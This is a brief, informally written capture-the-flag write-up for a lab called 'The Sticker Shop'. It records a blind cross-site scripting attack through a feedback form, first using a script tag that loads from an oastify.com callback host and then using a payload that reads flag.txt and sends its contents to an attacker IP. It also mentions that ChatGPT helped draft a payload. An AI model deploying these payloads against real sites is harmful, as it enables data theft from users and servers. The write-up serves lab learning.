@@ -1,0 +1,23 @@
+The Sticker Shop -- 30-Nov-2024
+
+In Room already stated flag location http://IP:8080/flag.txt
+
+Start with Website Acces Found Feedback - My thought
+	Feedback = XSS 
+	
+trying basics XSS </script>alert(1)<script>
+
+Not easy I know After some time Got blind XSS
+
+'"><script src=https://xyzh5f7ugxnj7919kl6eqcaohfn6bxzm.oastify.com></script>
+
+The chatgpt Come make payload to retrive flag
+But it use img tag Then manually use simple first It worked
+
+'"><script>
+  fetch('http://127.0.0.1:8080/flag.txt')
+    .then(response => response.text())
+    .then(data => {
+      fetch('http://10.8.6.102>:8000/?flag=' + encodeURIComponent(data));
+    });
+</script>
